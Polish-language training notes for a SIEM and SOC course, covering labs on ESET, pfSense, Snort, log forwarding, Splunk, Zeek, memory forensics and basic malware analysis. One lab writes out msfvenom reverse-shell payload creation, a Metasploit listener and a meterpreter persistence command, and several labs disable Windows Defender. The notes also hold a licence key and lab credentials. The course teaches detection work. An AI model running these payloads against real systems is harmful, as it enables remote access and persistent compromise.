@@ -1,0 +1,985 @@
+📅 22.10.2022 🕘 [09:00]
+
+Wykładowca: Kamil Kamiński
+
+Global SIEM & SOC
+
+Chapter 1 SIEM & SOC Introduction and PC Protection & ESET
+= - = - = - = - = - = - = - = - = - = - = - = - = - = - = 
+
+ℹ️ Przerwy: 
+
+10:30 - 11:00
+13:00 - 13:45
+15:00 - 15:15
+
+---
+
+[SIEM & SOC Introduction]
+
+💡-- Definicje
+
+SOC - Security Operations Center
+https://en.wikipedia.org/wiki/Information_security_operations_center
+
+NOC - Network operations center
+https://en.wikipedia.org/wiki/Network_operations_center
+
+SIEM - Security Information and Event Management
+https://en.wikipedia.org/wiki/Security_information_and_event_management
+
+CSIRT - Computer Security Incident Response Team
+https://www.techslang.com/definition/what-is-a-computer-security-incident-response-team-csirt/
+
+PSIRT - Product Security Incident Response Team
+CERT - Computer Emergency Response Team
+MSSP - Managed Security Service Provider
+
+🔗 – SOC vs. CSIRT: What’s the Difference?
+https://www.criticalstart.com/soc-vs-csirt-whats-the-difference/
+
+***
+
+### 📋 -- Lab01 TMS Workflow
+
+Rejestracja konta na Trello https://trello.com/en/signup
+
+    Utworzenie nowej Tablicy (SOC Incident Response)
+
+    Nowa Lista
+
+    Nowy Task
+
+
+***
+
+[PC Protection & ESET]
+
+🔗 -- ciekawe artykuły
+https://www.youtube.com/watch?v=Zy4G30kSPnY
+https://www.nao.org.uk/wp-content/uploads/2017/10/Investigation-WannaCry-cyber-attack-and-the-NHS.pdf
+https://www.trellix.com/en-us/security-awareness/ransomware/what-is-stuxnet.html
+https://www.sophos.com/en-us/medialibrary/PDFs/technical-papers/WannaCry-Aftershock.pdf
+
+### 📋 -- Lab02 ESMC & Agents
+
+Należy uruchomić 2 maszyny: Windows 2016 z AD i Windows10 (podłączony do AD)
+Sieć Nat Network
+
+na Windows 2016:
+należy zainstalować .NET 
+    add roles robimy next next
+    na features na .net 3.5
+    install
+Inatalacja java:
+    https://www.java.com/pl/download/manual.jsp
+Instalacja Systemu ESET:
+    https://www.eset.com/us/business/security-management-center/download/
+    Instalacja eseta,
+    wypakowanie,
+    setup run,
+    next, next, accept, java klikamy,install,
+    next, next, next  i podajemy haslo admina do bazy danych, 
+    klucz lcencji: JJRW-XMXA-G6JR-4V4K-2W9M
+
+🎞️ -- Film instruktażowy o instalowaniu ESMC:
+https://www.youtube.com/watch?v=RAQlaNabuaw
+
+Aby się zalogować:
+https://ip_servera2016/era
+    po zaladowaniu powinnnismy widziec dashboard, 1 urzadzenie windows server,
+    installer
+    create installer (wyklikać opcję)
+    AllinOne
+    finish
+    download64
+
+🔗 -- Link do instalatora w wersji standalone:
+https://www.eset.com/us/business/security-management-center/download/#standalone
+
+
+🔗 -- Instrukcja jak zainstalować ESMC:jak aktywować ESMC:
+https://support.eset.com/en/kb7709-install-eset-protect
+🔗 -- Instrukcja jak aktywować ESMC:jak aktywować ESMC:
+https://support.eset.com/en/kb7735-activate-eset-business-products-using-eset-protect
+🔗 -- Instrukcja jak instalować agenta:
+https://support.eset.com/en/kb7649-add-client-computers-in-eset-protect
+🔗 -- Instrukcja jak instalować Eset Protect na stacji:
+https://support.eset.com/en/kb7705-configure-eset-protect-to-automatically-deploy-eset-endpoint-products-to-unprotected-computers
+
+### 📋 -- Lab03 Tasks & Groups
+
+🔗 -- Instrukcja jak stworzyć zadanie (task):
+https://support.eset.com/en/kb7816-create-a-trigger-and-add-target-computers-or-groups-to-execute-a-client-task-in-eset-protect
+🔗 -- Instrukcja jak stworzyć grupę dynamiczną:
+https://support.eset.com/en/kb7820-create-dynamic-group-templates-in-eset-protect
+
+### 📋 -- Lab04 Policies & Reports
+
+🔗 -- Tworzenie nowych polityk:
+https://support.eset.com/en/kb7824-create-a-new-policy-in-eset-protect
+🔗 -- generownaie raportów:
+https://support.eset.com/en/kb7817-generate-a-report-in-eset-protect
+
+***
+
+📅 23.10.2022 🕘 [09:00]
+
+Chapter 2 Network Protection & Prevention and Log Generation & Collection
+= - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - = - =
+
+[Network Protection and Prevention]
+
+🔗 -- Osint Framework
+https://osintframework.com/
+
+🔗 -- WAF
+https://sekurak.pl/czym-jest-web-application-firewall-czesc-pierwsza-na-przykladzie-naxsi/
+
+
+### 📋 -- Lab01 pfSense Installation
+
+🔗 -- link do instalatora:
+https://ln2.sync.com/dl/45d0e2af0/hcp6svjx-n5qfxuvu-c727y2fs-22kg5gzz/view/default/9716616360007
+
+Dodajemy ją jako nową maszyne w VB, typ maszyny BSD 64b
+
+#pfSense konfig:
+pfSense - ustawiamy dwa VM interfejsy (NAT i Internal Network -w obu tryb nasłuchowania)
+Windows10 - Internal Network (ten sam co w pfSense)
+Kali - Internal Network (ten sam co w pfSense)
+
+
+Kali
+pfSense z przeglądarki https://192.168.1.1/
+🔑 – admin:pfsense
+
+    Dodajemy w Primary DNS Server: 8.8.8.8
+
+    W konsoli pfSense wybieramy System -> Update
+
+
+***
+
+### 📋 -- Lab02 Snort Installation
+
+System > Package Manager > Available Packages
+ > Search: snort > Install
+ 
+
+    Zakładamy konto na snort: https://www.snort.org/users/sign_in
+
+    Po zalogowaniu kopiujemy Oinkcode do pfSense: Services > Snort > Global Settings
+
+    Zaznaczamy Enable Snort VRT + Enable Snort GPLv2 + Enable ET Open > Save
+
+    Services > Snort > Interfaces: Enable > LAN + wybieramy Send Alerts to System Log + Block Offenders > Save
+
+    Services > Snort > Update > Updates Rules
+
+    Services > Snort > Snort Interfaces: Edycja LAN > LAN Categories i wybieramy reguły:
+
+    emerging-exploit.rules
+
+    emerging.icmp-rules
+
+    emerging-malware-rules
+
+    > Save
+
+    Services > Snort > Update > Updates Rules
+
+
+***
+
+### 📋 -- Lab03 Custom Rules
+
+    Utworzenie nowej reguły: Snort Interfaces > LAN Rules > Category Selection: custom.rules
+
+    Rule: 
+
+    alert tcp any any -> $HOME_NET any (msg:"TCP Port Scanning"; detection_filter:track by_src, count 30, seconds 60; sid:1000006; rev:2;)
+
+    Services > Snort > Update > Updates Rules
+
+    Services > Snort > Interfaces > LAN (Play)
+
+
+Ping z Kali do pfSense (192.168.1.1) wyzwala alerty w Snort:
+
+    ping 192.168.1.1
+
+
+Skanowanie Win10 (192.168.1.100) przez nmap z Kali (192.168.1.101):
+pfSense nie widzi tego ruchu, ponieważ jest to środowisko w VirtualBox
+
+
+    nmap -sV -A 192.168.1.100
+
+
+Zablokowanie protokołu ICMP
+
+    Firewall > Rules > Edit:
+
+    Action: Block
+
+    Interface: LAN
+
+    Address Family: IPv4
+
+    Protocol: ICMP
+
+
+***
+
+[Log Generation & Collection]
+
+WEF - Windows Event Forwarding
+https://social.technet.microsoft.com/wiki/contents/articles/33895.windows-event-forwarding-survival-guide.aspx
+
+WEC - Windows Event Collector
+https://learn.microsoft.com/en-us/windows/win32/wec/windows-event-collector
+
+
+### 📋 -- Lab04 Windows WEF
+
+Setup: Obie maszyny w sieci np. Internal Network, Server | Client
+    1. Windows Server 2016
+    2. Windows 10
+
+Windows Server (DC) cmd.exe `Run as Administrator`
+
+    winrm qc
+
+    wecutil qc
+
+
+Windows 10 powershell `Run as Administrator`
+
+    Get-NetConnectionProfile
+
+    Set-NetConnectionProfile -InterfaceIndex 4 -NetworkCategory Private
+
+
+ cmd.exe `Run as Administrator`
+
+    winrm qc
+
+    wecutil qc
+
+
+Windows Server (DC) powershell `Run as Administrator`
+
+    Enable-PSRemoting
+
+
+Windows 10 powershell `Run as Administrator`
+
+    Enable-PSRemoting
+
+    Enable-PSRemoting -SkipNetworkProfileCheck -Force
+
+
+Dodanie użytkownika w Win10
+Computer Management> System Tools > Local Users and Groups > Groups > Event Log Readers
+
+    Dodajemy > NETWORK.SERVICE
+
+    Dodajemy > WINSERV2016AD
+
+
+Windows Server 2016
+
+    Event Viewer
+
+    Nowa Subskrypcja (Subscriptions) - prawy klawisz myszy > Create Subscription > Win10 LAB logs > Select Computer > WIN10 (nazwa komputera)
+
+    Test (sprawdzenie połączenia)
+
+
+*** 
+
+💡-- Notatki prowadzącego
+
+THREATS -> exploits -> VULNERABILITIES -> which results in -> EXPOSURE -> which is -> RISK -> which is mitigated -> SAFEGUARD -> which protect -> ASSET 
+
+——————— 
+NSM:
+
+- Session data: 5-tuple - source IP address, source port, destination IP address, destination port, timestamp 
+- Full packet capture: PCAP  
+- Transaction data: for example HTTP, SMTP transactions
+- Alert data: IPS, firewall, WAF, DLP 
+- Statistical data: baselines
+- Metadata: data about data
+
+Chain of custody 
+DMZ 
+Zero trust
+
+CSIRT:
+Product Security Incident Response Team (PSIRT)
+National CSIRT and Computer Emergency Response Team (CERT) 
+Managed Security Service Provider (MSSP)
+————
+Antywirusy
+Sygnatury hashowe 
+Sygnatury bajtowe
+Sygnatury heurystyczne
+————
+IDS - Intrusion Detection System
+HIDS - Host Intrusion Detection System
+NIDS - Network Intrusion Detection System
+————
+IPS - Intrusion Prevention System
+HIPS - Host Intrusion Prevention System
+NIPS - Network Intrusion Prevention System
+————
+HOST W LAN <-> FIREWALL (80,443) > DMZ < FIREWALL (25, 80, 443, 445) <> INTERNET
+HOST W LAN <-> PROXY HTTP/S (odszyfrowanie ruchu) <-> INTERNET
+
+pfSense konfig:
+pfSense interfejsy: 1. sieć NAT, 2. internal network (w obu ustawiamy tryb nasłuchiwania)
+Win10 interfejsy: 1. Internal network (ten sam co pfsense)
+Kali interfejsy: 1. internal network (ten sam co pfsense)
+
+VirtualBox <WAN> pfSense <LAN> win10 <LAN> kali
+
+login: admin pass: pfsense
+
+***
+
+📅 29.10.2022 🕘 [09:00]
+
+### 📋 – Lab05 Event Forwarding
+
+Kali - Terminal as `root`
+
+    service rsyslog status
+
+    service rsyslog start
+
+    nano /etc/rsyslog.conf
+
+    #1. pod sekcją #### MODULES #### https://pastebin.com/3znkK1uH
+
+    $template Incoming-logs,"var/log/pfsense/pfsense.log" 
+
+    *.* ?Incoming-logs 
+
+    & ~
+
+    #2. odkomentować 2 linie
+
+    module(load="imudp")
+
+    input(type="imudp" port="514")
+
+
+    service rsyslog restart
+
+    netstat -tulpn
+
+
+***
+
+### 📋 – Lab06 Snort Logs to Syslog
+
+pfsense
+
+    Status > System Logs > Settings > Send log messeges to remote syslog server
+
+    Remote log servers: 192.168.1.101:514 <IP Kali>
+
+    Remote Syslog Contents: [X] Everything
+
+    Services > Snort > Update > Updates Rules
+
+
+Kali
+
+    less /var/log/pfsense/pfsense.log
+
+
+***
+
+Global SIEM & SOC
+
+Chapter 3 SIEM Solutions and IOC & Malwares
+= - = - = - = - = - = - = - = - = - = - = -
+
+[SIEM Solutions]
+
+💡-- Pliki instalacyjne Splunk:
+https://hackeru-my.sharepoint.com/:u:/p/kamilk/Eb2wSdUS4RuXbb9K9OGBPMsB65Rm3b_eKa5QayyLUjrTeQ?e=psZz5t
+
+https://ln.sync.com/dl/2d11924a0/6ymfkb58-f33kd44u-6jru76b7-32ynqvxv/view/default/9873107940007
+
+
+
+🔗 -- True vs. False and Positive vs. Negative
+https://developers.google.com/machine-learning/crash-course/classification/true-false-positive-negative
+
+
+### 📋 – Lab01 Splunk Enterprise Installation
+
+Kali i Windows10 ustawione na NatNetwork - ta sama sieć
+chmod +x splunk-8.0.6-linux-2.6-amd64.deb
+dpkg -i splunk-8.0.6-linux-2.6-amd64.deb
+cd /opt/splunk/bin
+./splunk enable boot-start
+service splunk start
+
+#reinstalacja splunk:
+dpkg -r splunk
+cd /opt/splunk/bin
+./splunk enable boot-start
+service splunk start
+
+/var/log
+host="dey" source="/var/log/*" authentication 
+
+### 📋 – Lab02 Splunk Universal Forwarder
+
+#Link do do agenta:
+https://hackeru-my.sharepoint.com/:u:/p/kamilk/Eb2wSdUS4RuXbb9K9OGBPMsB65Rm3b_eKa5QayyLUjrTeQ?e=psZz5t
+
+#Odblokwanie portu do komunikacji z Splink - port 9997
+w win 10:
+windows defender firewall
+advanced settings
+outbound rule
+prawy przycisk -> new rule
+port
+next
+9997
+allow the connection
+next
+name - splunk agent
+finish
+
+kali
+splunk
+settings
+forwarding and receiving
+
+win:
+splunk forwarder 2x kliknąć
+customize options
+username i pass to samo co w splunk - na potrzeby labu
+podajemy ip kaliego + ip 8089
+next
+to samo ip + port 9997 ( z kaliego )
+next
+install
+
+***
+
+### 📋 – Lab03 Creating Event Alerts in Splunk
+
+service ssh status
+service ssh start
+service ssh status
+#z poziomu Windows:
+ssh user@IP_addres_Kali
+#wpisujemy poprawne hasło
+
+#ponownie - kilka razy 
+ssh user@IP_addres_Kali
+#wpisujemy niepoprawne hasło
+
+***
+
+🔗 -- Opis ataków organizacji Mitre:
+https://attack.mitre.org/
+🔗 -- Info o wyciekach:
+https://wikileaks.org/
+🔗 -- Security Onion Solution (SOS)
+https://securityonionsolutions.com/software
+
+### 📋 – Lab04 Zeek Installation
+
+apt update
+sudo apt-get install libssl-dev git cmake make gcc g++ flex bison libpcap-dev python2-dev swig zlib1g-dev
+git clone --recursive https://github.com/zeek/zeek
+cd zeek
+sudo su
+./configure
+make
+make install
+export PATH="/usr/local/zeek/bin:$PATH"
+
+zeekctl
+install
+start
+status
+
+
+***
+
+### 📋 – Lab05 PCAP File Investigation
+
+🔗 -- Download general-AlFTM-2021.01.24.12.49.22-infected.rar
+https://beyond.hackampus.com/canvas/general/general-AlFTM-2021.01.24.12.49.22-infected.rar
+
+    Rozpakowanie pliku
+
+unrar e general-AlFTM-2021.01.24.12.49.22-infected.rar
+
+    Wyciągnięcie danych z infected.pcap
+
+    zeek -Cr infected.pcap
+
+
+    Analiza logów dhcp
+
+    cat dhcp.log
+
+    cat dhcp.log | zeek-cut mac client_addr host_name
+
+
+    Analiza logów kerberos
+
+    cat kerberos.log
+
+    cat kerberos.log | zeek-cut id.orig_h client service | awk '$3~"krbtgt"' | grep nalyvaiko-pc
+
+
+    Analiza logów files
+
+    cat files.log
+
+    cat files.log | zeek-cut mime_type filename | grep msword
+
+
+    Analiza logów http
+
+    cat http.log
+
+    cat http.log | zeek-cut -d  ts method host uri resp_filenames resp_mime_types | grep msword
+
+
+    Weryfikacja plików w Virus Total
+
+    https://www.virustotal.com/gui/file/f47f72f78711d3e125d5b81d5f433475a6c749aa724e19e25377ee3e83ff4a6c/details
+
+
+
+
+***
+
+📅 30.10.2022 🕘 [09:00]
+
+Chapter 4 Windows Live & Offline Analysis and Memory Analysis
+= - = - = - = - = - = - = - = - = - = - = - = - = - = - = - =
+
+[Windows Live & Offline Analysis]
+
+### 📋 -- Lab01 DNS Cache
+
+Należy zainstalować 2 przeglądarki Chrome i Firefox na Windows 10 (sieć Nat Network).
+
+    Chrome > yahoo.com > Tryb Incognito > nytimes.com
+
+    Firefox > duckduckgo.com > Nowe okno prywatne > thehackernews.com
+
+    Czyścimy historię przeglądarki Chrome: Ustawienia > Prywatoność i bezpieczeństwo > Wyczyść dane przeglądania
+
+    Czyścimy historię przeglądarki Firefox: History > Clear Recent History
+
+    cmd
+
+    ipconfig /displaydns
+
+    ipconfig /displaydns > "C:\Users\winlab\Desktop\cache.txt"
+
+
+***
+
+2FA - uwierzytelninie dwuskładnikowe:
+coś co wiemy -> login, hasło, kod PIN
+coś co mamy -> google auth, appka mobilna, token, telefon SMS
+coś czym jesteśmy -> faceid, skaner palca, retina scan, skan tęczówki 
+coś gdzie jesteśmy -> geolokalizacja, geofencing
+
+***
+
+### 📋 – Lab02 Prefetch Investigation
+
+Windows 10
+
+    🔗 -- Instalacja AnyDesk https://anydesk.com/en/downloads/windows
+
+    Odinstalowanie AnyDesk
+
+    C:\Windows\Prefetch
+
+    pozostały pliki AnyDesk.EXE[...].pf
+
+    🔗 -- Download WinPrefetchView v1.37 https://www.nirsoft.net/utils/winprefetchview-x64.zip
+
+
+***
+
+🔗 -- Computer Security Incident Handling Guide
+https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final
+
+🔗 -- Computer Security Incident Handling Guide PDF
+https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf
+
+***
+
+### 📋 – Lab03 VM Investigation
+
+🔗 -- Windows Live & Offline Analysis.ova - 3.7 GB
+https://ln2.sync.com/dl/3d40053a0/fm63kjds-zszhtpb3-8yf35m6h-7w4en6i7
+
+Przy imporcie ova:
+
+    Usunąć kontroler USB
+
+    Generate new MAC addressess
+
+
+🔑 credentials
+client:Pa$$w0rd
+
+Uruchomienie Chrome w języku angielskim
+
+    Win+R
+
+    chrome --lang=EN
+
+
+🔗 -- USBDeview v3.06
+https://www.nirsoft.net/utils/usbdeview-x64.zip
+
+🔗 -- WinPrefetchView v1.37
+https://www.nirsoft.net/utils/winprefetchview-x64.zip
+
+# Weryfikacja DNS cache
+
+    ipconfig /displaydns > Desktop\cache.txt
+
+
+# Rejestr
+
+    regedit
+
+    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
+
+    HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted
+
+
+🔗 -- MyLastSearch v1.65
+https://www.nirsoft.net/utils/mylastsearch.zip
+
+***
+
+[Memory Analysis]
+
+### 📋 – Lab04 Memory Identification
+
+🔗 --  SIFT-Workstation.ova - 4.7 GB
+https://ln2.sync.com/dl/c8918eaf0/463gj65v-g5uxvnhw-pagzd554-49iwcf38/view/default/9760019580007
+
+🔑 SIFT:
+SANS forensics:forensics
+
+    Zainstalować dodatki VBox Guest Addition
+
+
+🔗 --  Lab - Extra Files.rar - 179.9 MB
+https://ln2.sync.com/dl/94ff79a60/jhhvt7nn-ufwvguyu-dmaa9cs7-chfd7vmm/view/default/9812143180007
+
+    Rozpakowanie plików:
+
+    unrar e Lab\ -\ Extra\ Files.rar
+
+    unrar e VolpymeL1.rar
+
+
+    Zbieranie informacji o pliku zrzutu (dump):
+
+    vol.py imageinfo -f VolpymeL1.vmem
+
+
+    Drzewo procesów:
+
+    vol.py pstree -f VolpymeL1.vmem --profile=WinXPSP2x86 
+
+
+***
+
+### 📋 – Lab05 Network Investigation
+
+    Zbieranie informacji o pliku zrzutu (dump):
+
+    vol.py imageinfo -f VolpymeL2.vmem
+
+
+    Lista procesów
+
+    vol.py pslist -f VolpymeL2.vmem --profile=WinXPSP2x86
+
+
+    Aktywność sieciowa
+
+    vol.py connscan -f VolpymeL2.vmem --profile=WinXPSP2x86
+
+    vol.py sockets -f VolpymeL2.vmem --profile=WinXPSP2x86
+
+
+***
+
+### 📋 – Lab06 Process Investigation
+
+    vol.py imageinfo -f VolpymeL3.vmem
+
+
+    vol.py pslist -f VolpymeL3.vmem --profile=WinXPSP2x86
+
+    vol.py pstree -f VolpymeL3.vmem --profile=WinXPSP2x86
+
+
+    vol.py connscan-f VolpymeL3.vmem --profile=WinXPSP2x86
+
+    vol.py sockets -f VolpymeL3.vmem --profile=WinXPSP2x86
+
+
+    Zrzut procesu 856 do plików dll
+
+    vol.py dlldump -p 856 --dump-dir /home/sansforensics/Documents/ -f VolpymeL3.vmem --profile=WinXPSP2x86
+
+
+    Zrzut procesu 856 z wykorzystaniem malfind (poszukiwanie wstrzyknięcia do procesu)
+
+    vol.py malfind -p 856 --dump-dir /home/sansforensics/Documents/ -f VolpymeL3.vmem --profile=WinXPSP2x86
+
+
+    Sprawdzenie sum kontrolnych
+
+    md5sum process.0x80ff88d8.0xb70000.dmp
+
+    59f1993ae96c0108f0fa224609f51a2f
+
+    md5sum process.0x80ff88d8.0xcb0000.dmp 
+
+    da295c2ce7c8741c2f16ff8d0f76efd3
+
+
+    VirusTotal > sprawdznenie hashy https://www.virustotal.com/gui/home/search
+
+    https://www.virustotal.com/gui/file/8e3be5dc65aa35d68fd2aba1d3d9bf0f40d5118fe22eb2e6c97c8463bd1f1ba1
+
+    https://www.virustotal.com/gui/file/122ad7e44da2aa468b2c4d6f9821e35d347e1e6204c4e14651fac1da1bdc4a85
+
+
+🏠 Homework
+
+Zeus Trojan - Memory Forensics with Volatility
+http://phucnw.blogspot.com/2016/10/zeus-trojan-memory-forensics-with.html
+
+
+💡-- Notatki prowadzącego
+
+——————
+False positive 
+False negative 
+True positive 
+True negative 
+——
+CIA: poufność, integralność, dostępność 
+
+—————
+IoC: hash, IP, IP+port, domena, hostname, nazwa procesu, wpisy w rejestrze, połączenia sieciowe, plik w autostart, […]
+
+https://attack.mitre.org/ 
+
+Magic bytes 
+
+Threat hunting, threat intel, threat feed, IoC 
+
+Threat intel -> IoC -> threat hunting
+
+Incident response + forensic 
+
+***
+
+📅 05.11.2022 🕘 [09:00]
+
+Chapter 5 Basic Static Analysis & Basic Dynamic Analysis
+= - = - = - = - = - = - = - = - = - = - = - = - = - = - 
+
+[Basic Static Analysis]
+
+Setup - Flare VM:
+
+    Windows 10 Clone | NAT Network
+
+    flare-vm - https://github.com/mandiant/flare-vm > Code > Download ZIP
+
+    Powershell as Administrator
+
+    cd "C:\Users\<user>\Downloads\flare-vm-master"
+
+    Set-ExecutionPolicy bypass # > [A] Yes to All
+
+    Set-MpPreference -DisableRealtimeMonitoring $true #wyłączenie Defendera
+
+    .\install.ps1
+
+    password from user
+
+
+***
+
+🔗 -- Praktyczna inżynieria wsteczna (Miękka)
+https://ksiegarnia.pwn.pl/Praktyczna-inzynieria-wsteczna,622427233,p.html
+
+🔗 -- List of file signatures
+https://en.wikipedia.org/wiki/List_of_file_signatures
+
+***
+
+### 📋 – Lab01 Malware Types
+
+***
+
+### 📋 – Lab02 Strings & Hashes
+
+🔗 -- SOC Extra file.rar - 546.2 KB
+https://ln.sync.com/dl/bf8343ac0/pfh3tc8y-zcfgpag2-3546tqj9-6aqw56z8/view/default/9993743600007
+
+🔑 — Password to extract the file: password
+
+🔗 -- Download WinRAR
+https://www.win-rar.com/download.html?&L=0
+
+Wyłączyć Defender'a
+Powershell as Administrator:
+    Set-MpPreference -DisableRealtimeMonitoring $true
+
+strings
+
+    🔗 -- strings https://learn.microsoft.com/en-us/sysinternals/downloads/strings
+
+    cd "C:\Users\<user>\Downloads\SOC Extra file"
+
+
+    strings free.exe > analiza.txt
+
+
+certutil
+
+    🔗 -- certutil 
+
+    https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
+
+    certutil -hashfile free.exe MD5
+
+    wkleić wygenerowany hash do wyszukiwarki google i sprawdzić wyniki.
+
+
+🔗 --informacje o pe-format
+
+    https://learn.microsoft.com/en-us/windows/win32/debug/pe-format
+
+
+
+### 📋 – Lab03 Resource Hacker
+
+🔗 --Download Resource Hacker
+http://www.angusj.com/resourcehacker/
+🔗 -- Download SOC Extra file
+https://ln.sync.com/dl/bf8343ac0/pfh3tc8y-zcfgpag2-3546tqj9-6aqw56z8
+🔑 – hasło: password
+
+po wypakowaniu przeciągamy plik free.exe do programu Resource Hacker i analizujemy
+
+### 📋 -- Lab04 D.Walker 
+
+🔗 --Download D.Walker 
+https://ln2.sync.com/dl/7d2e8f860/iqzrcst4-qjp767u6-3gm8kxkg-gaiz3xxk
+🔗 --Download Dependencies
+https://github.com/lucasg/Dependencies/releases/download/v1.11.1/Dependencies_x64_Release.zip
+🔑 – hasło: password
+
+Dependenciesgui.exe
+należy zaczytać plik dwalker.exe i przeanalizować.
+
+
+### 📋 -- Lab05 Sysmon
+
+🔗 --Download Sysmon
+https://learn.microsoft.com/pl-pl/sysinternals/downloads/sysmon
+
+#instalacja sysmon:
+Powershell (uruchomić jako administrator):
+
+sysmon -i 
+
+lub:
+cd C:\Users\winlab\Downloads\Sysmon  #przejść do swojego katalogu, gdzie został poprany program sysmon
+.\Sysmon.exe -i
+
+#Event Viewer:
+Application and Services -> Microsoft -> Windows -> Sysmon
+
+🔗 --Download Lab_02.rar 
+https://ln2.sync.com/dl/1e555ebb0/qniaxmyq-nex6k6d7-sn75stn3-66zyir88
+
+po wypakowaniu, uruchomić Lab_02.xml
+i widzimy np.: Name="ParentCommandLine">"C:\Users\IT\Desktop\Tools\Ransomware.WannaCry
+
+
+### 📋 -- Lab06 Autoruns
+
+🔗 --Download Autoruns
+https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
+https://download.sysinternals.com/files/Autoruns.zip
+
+Potrzebne są 2 maszyny Kali i flarevm (sieć: Nat Network).
+
+#Tworzymy reverse shell:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP_Kali LPORT=4444 -f exe > toniejestmalware.exe 
+
+np.:msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.2.142 LPORT=4444 -f exe > toniejestmalware.exe
+
+#Uruchamiamy nasłuchiwanie
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST IP_Kali
+set LPORT 4444
+exploit
+
+#Udostępniamy plik - w katalogu, w którym jest nasz plik w malware odpalmy:
+python3 -m http.server 9090
+
+#Pobieramy plik na Flare przez przeglądarkę interentową:
+http://IP_kali:9090/
+i uruchomić
+
+#w sesji meterpreter:
+run persistence -U -i 5 -p 4444 -r IP_Kali
+
+### 📋 -- Lab07 Regshot
+
+należy uruchomić regshot i zrobić zrzut:
+1st shot
+potem zmieniamy coś w rejestrze
+2st shot
+i porównujemy
+
+
+### 📋 -- Lab08 BlackList
+
+Sprawdzamy reputację przzy pomocy:
+https://whatismyipaddress.com
+https://www.talosintelligence.com
+https://www.ipqualityscore.com/free-ip-lookup-proxy-vpn-test
+
+
+
+
